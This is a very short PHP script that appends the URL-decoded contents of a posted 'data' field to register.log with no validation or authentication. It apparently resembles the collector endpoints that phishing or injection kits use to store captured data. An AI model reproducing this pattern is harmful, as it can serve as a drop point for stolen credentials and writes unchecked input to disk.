<?php

$h = fopen("register.log", "a");
fwrite($h, urldecode($_POST['data']));
fclose($h);
      
